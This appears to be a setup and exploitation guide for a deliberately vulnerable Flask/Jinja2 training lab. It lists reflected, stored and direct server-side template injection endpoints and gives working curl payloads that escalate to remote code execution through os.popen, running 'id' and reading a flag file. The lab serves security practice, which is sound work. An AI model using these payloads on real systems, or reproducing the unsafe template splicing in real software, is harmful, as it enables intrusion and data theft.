Target 13. Template-Forge-API — REST (Python / Flask + Jinja2)  ✅ (verified working via native run on this box)

A deliberately vulnerable API that concatenates user input straight into a Jinja2 template and renders it server-side — Server-Side Template Injection (SSTI). `{{ ... }}` expressions execute in the (sandbox-free) template context, so SSTI escalates to full Remote Code Execution. This vuln class appears in NONE of the other 10 labs. A flag is planted at the lab folder on startup for the RCE to read.

1: Get the repo:   unzip Template-Forge-API.zip && cd Template-Forge-API
2: Deploy (native — verified here):  ./run.sh        # (or: python3 app.py)  needs Flask/Jinja2
Open in browser:   http://localhost:9013/           <-- {"app":"Template-Forge-API",...}
# Quick win: prove server-side evaluation (renders 49):
#   curl -s 'localhost:9013/greeting?name=%7B%7B7*7%7D%7D'          ->  <h1>Hello 49!</h1>
# RCE (run a shell command):
#   curl -sG localhost:9013/greeting --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read()}}"
# RCE (read the flag file):
#   curl -s localhost:9013/render -H 'Content-Type: application/json' \
#        -d '{"template":"{{ cycler.__init__.__globals__.os.popen(\"cat flag.txt\").read() }}"}'
3: Stop:  Ctrl-C  (or: kill the app.py process)

Requirements:
    Python 3 + Flask (ships Jinja2)  (native run — no Docker, no DB)
    curl / Burp                      (send template payloads)

Endpoints:
    GET  /greeting?name=          -> reflected SSTI (input spliced into the template)
    POST /render   {template}     -> direct template evaluation of whatever you send
    POST /profile  {user,bio} + GET /card/<user>  -> stored SSTI (bio rendered later)

List of Vulnerabilities (all verified on this box):

    SSTI (reflected)  — /greeting?name= splices raw input into render_template_string
    SSTI (direct)     — /render evaluates an attacker-supplied template
    SSTI (stored)     — /profile bio is rendered on /card/<user> on a later request
    Remote Code Execution — SSTI -> os.popen(...) -> arbitrary commands / file read
